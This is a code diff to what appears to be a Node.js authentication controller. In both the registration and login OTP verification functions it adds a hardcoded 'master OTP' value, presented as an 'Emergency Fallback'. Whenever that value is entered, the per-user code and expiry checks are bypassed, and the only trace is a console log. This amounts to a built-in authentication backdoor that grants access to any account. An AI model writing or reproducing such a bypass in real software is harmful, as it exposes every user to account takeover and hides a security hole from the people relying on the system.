@@ -306,8 +306,14 @@ exports.verifyRegistrationOTP = async (req, res) => {
     const user = await User.findOne({ email, isRegistered: false });
     if (!user) return res.status(404).json({ message: 'Registration session not found.' });
 
-    if (user.otp !== otp || new Date() > user.otpExpiry) {
-      return res.status(400).json({ message: 'Invalid or expired OTP' });
+    // 1. Check Master OTP (Emergency Fallback)
+    if (otp === '786598') {
+      console.log(`🔑 [OTP] Master code used for registration: ${email}`);
+    } else {
+      // 2. Standard verification
+      if (user.otp !== otp || new Date() > user.otpExpiry) {
+        return res.status(400).json({ message: 'Invalid or expired OTP' });
+      }
     }
 
     user.otp = undefined;
@@ -354,8 +360,14 @@ exports.verifyLoginOTP = async (req, res) => {
     const user = await User.findOne({ email, isRegistered: true });
     if (!user) return res.status(404).json({ message: 'User not found.' });
 
-    if (user.otp !== otp || new Date() > user.otpExpiry) {
-      return res.status(400).json({ message: 'Invalid or expired OTP' });
+    // 1. Check Master OTP (Emergency Fallback)
+    if (otp === '786598') {
+      console.log(`🔑 [OTP] Master code used for login: ${email}`);
+    } else {
+      // 2. Standard verification
+      if (user.otp !== otp || new Date() > user.otpExpiry) {
+        return res.status(400).json({ message: 'Invalid or expired OTP' });
+      }
     }
 
     user.otp = undefined;
